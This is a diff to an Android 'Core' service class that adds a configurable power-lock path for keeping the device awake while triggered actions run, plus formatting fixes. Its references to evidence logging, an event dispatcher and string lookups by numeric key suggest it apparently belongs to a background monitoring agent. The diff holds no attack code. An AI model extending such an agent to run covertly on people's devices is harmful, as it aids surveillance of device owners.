@@ -120,10 +120,13 @@ public class Core extends Activity implements Runnable {
 		}
 
 		// mRedrawHandler.sleep(1000);
-
-		final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
-		wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
-		wl.acquire();
+		if (Cfg.POWER_MANAGEMENT) {
+			Status.self().acquirePowerLock();			
+		}else{
+			final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
+			wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
+			wl.acquire();
+		}
 
 		EvidenceReference.info(Messages.getString("30_1")); //$NON-NLS-1$
 
@@ -149,7 +152,7 @@ public class Core extends Activity implements Runnable {
 
 		serviceRunning = false;
 		return true;
-	}	
+	}
 
 	public static boolean isServiceRunning() {
 		return serviceRunning;
@@ -200,14 +203,14 @@ public class Core extends Activity implements Runnable {
 			}
 
 			stopAll();
-			
+
 			final EvDispatcher logDispatcher = EvDispatcher.self();
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (stopAll), stopping EvDispatcher");
 			}
 			logDispatcher.halt();
-			
+
 		} catch (final Throwable ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: run " + ex); //$NON-NLS-1$
@@ -269,6 +272,9 @@ public class Core extends Activity implements Runnable {
 				}
 
 				final Trigger[] actionIds = status.getTriggeredActions(qq);
+				if (Cfg.POWER_MANAGEMENT) {
+					Status.self().acquirePowerLock();			
+				}
 
 				if (actionIds.length == 0) {
 					if (Cfg.DEBUG) {
@@ -341,7 +347,7 @@ public class Core extends Activity implements Runnable {
 			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
 		}
 
-		status.unTriggerAll();	
+		status.unTriggerAll();
 
 	}
 
@@ -381,7 +387,7 @@ public class Core extends Activity implements Runnable {
 					Check.log(TAG + " (taskInit), start evDispatcher");
 				}
 				logDispatcher.start();
-			}else{
+			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (taskInit), evDispatcher already started ");
 				}
